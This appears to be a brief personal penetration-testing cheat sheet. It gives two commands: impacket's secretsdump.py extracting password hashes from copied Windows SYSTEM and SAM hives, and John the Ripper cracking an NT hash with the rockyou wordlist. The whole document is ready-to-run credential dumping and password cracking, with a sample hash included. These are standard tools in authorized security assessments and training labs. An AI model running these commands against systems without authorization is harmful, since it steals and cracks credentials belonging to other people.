## secretdump
`python3 ./impacket/examples/secretsdump.py -system /tmp/Public/SYSTEM -sam /tmp/Public/SAM LOCAL`
## john(rockyou)
```
echo "aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95" > hash
john --fork=4 --format=nt hash --wordlist=/usr/share/wordlists/rockyou.txt
```
